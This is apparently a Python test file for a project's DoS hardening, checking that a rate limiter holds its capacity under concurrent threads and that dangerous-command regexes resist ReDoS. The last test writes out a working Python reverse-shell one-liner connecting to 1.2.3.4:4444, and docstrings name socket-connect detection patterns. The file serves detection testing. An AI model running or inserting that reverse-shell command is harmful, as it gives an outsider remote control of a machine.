# DoS-hardening tests: rate-limiter concurrency + ReDoS regression.
# Added: 2026-04-16 for security sprint cluster F (#891, #895).

from __future__ import annotations

import threading
import time

import pytest


# ---------------------------------------------------------------------------
# #891 — Rate limiter TOCTOU race
# ---------------------------------------------------------------------------


class TestRateLimiterConcurrency:
    def test_concurrent_check_does_not_exceed_capacity(self):
        """Many threads racing through .check() must not hand out more tokens
        than the bucket's capacity. Without a lock the check-then-decrement
        is a race and the count exceeds capacity under contention.
        """
        from pocketpaw.security.rate_limiter import RateLimiter

        limiter = RateLimiter(rate=0.01, capacity=10)
        allowed = 0
        counter_lock = threading.Lock()

        def hammer():
            nonlocal allowed
            info = limiter.check("client-x")
            if info.allowed:
                with counter_lock:
                    allowed += 1

        threads = [threading.Thread(target=hammer) for _ in range(200)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert allowed <= 10, (
            f"rate limiter let {allowed} requests through with capacity=10 — TOCTOU race"
        )


# ---------------------------------------------------------------------------
# #895 — ReDoS in dangerous-command regex
# ---------------------------------------------------------------------------


class TestRegexReDoSBudget:
    def test_no_chained_unbounded_dot_star_quantifiers(self):
        """After the fix, no pattern should contain two or more unbounded
        ``.*`` quantifiers in a row. That chain is what gives ``python -c
        .*socket.*connect`` / ``perl -e .*socket.*INET`` their ReDoS shape
        under pathological input (issue #895).
        """
        from pocketpaw.security.rails import DANGEROUS_PATTERNS

        offenders = []
        for pat in DANGEROUS_PATTERNS:
            # Two unbounded `.*` in the same pattern = candidate for
            # catastrophic backtracking. Bounded alternatives like
            # `.{0,200}` are fine.
            if pat.count(".*") >= 2:
                offenders.append(pat)
        assert not offenders, (
            "regex patterns still contain chained unbounded .* quantifiers "
            f"(ReDoS risk): {offenders}"
        )

    def test_dangerous_scan_finishes_under_budget_on_adversarial_input(self):
        """Runtime smoke — even on long attacker-controlled input the scan
        stays under a generous budget.
        """
        from pocketpaw.security.rails import COMPILED_DANGEROUS_PATTERNS

        adversarial = "python -c '" + ("a" * 10000) + "socket" + ("b" * 10000) + "'"

        start = time.monotonic()
        for p in COMPILED_DANGEROUS_PATTERNS:
            p.search(adversarial)
        elapsed = time.monotonic() - start
        assert elapsed < 0.5, (
            f"regex scan took {elapsed:.3f}s on adversarial input — ReDoS"
        )

    def test_real_reverse_shell_still_detected(self):
        """The fix must not regress detection of actual reverse-shell
        commands — python -c with socket+connect still needs to match.
        """
        from pocketpaw.security.rails import COMPILED_DANGEROUS_PATTERNS

        # Canonical python reverse shell one-liner
        cmd = (
            "python -c 'import socket,os,pty;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"1.2.3.4\",4444));"
            "os.dup2(s.fileno(),0)'"
        )
        hit = any(p.search(cmd) for p in COMPILED_DANGEROUS_PATTERNS)
        assert hit, "real python reverse shell no longer matches after fix"
